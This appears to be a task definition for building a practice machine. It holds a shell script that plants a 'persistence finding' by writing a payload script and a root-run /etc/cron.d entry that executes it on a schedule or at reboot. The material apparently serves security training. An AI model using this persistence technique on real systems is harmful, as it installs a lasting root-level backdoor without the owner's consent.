name: cron-d-persistence
description: Practice-box persistence finding: drops a payload script and a root-owned /etc/cron.d entry that runs it on a schedule. Vars: CRON_FILE (required, basename inside /etc/cron.d), SCHEDULE (required, five cron fields or @reboot), PAYLOAD_PATH (required, absolute), PAYLOAD_BODY (optional single sh line, default logs nothing), RUN_AS_USER (optional, default root).
script:
#!/bin/sh
set -eu


: "${CRON_FILE:?CRON_FILE is required (basename inside /etc/cron.d)}"
: "${SCHEDULE:?SCHEDULE is required (five fields or @reboot)}"
: "${PAYLOAD_PATH:?PAYLOAD_PATH is required}"

install -d -m 0755 "$(dirname -- "$PAYLOAD_PATH")"
printf '#!/bin/sh\n%s\n' "${PAYLOAD_BODY-}" > "$PAYLOAD_PATH"
chmod 0755 "$PAYLOAD_PATH"

printf '%s %s %s\n' "$SCHEDULE" "${RUN_AS_USER:-root}" "$PAYLOAD_PATH" \
    > "/etc/cron.d/$CRON_FILE"
chmod 0600 "/etc/cron.d/$CRON_FILE"
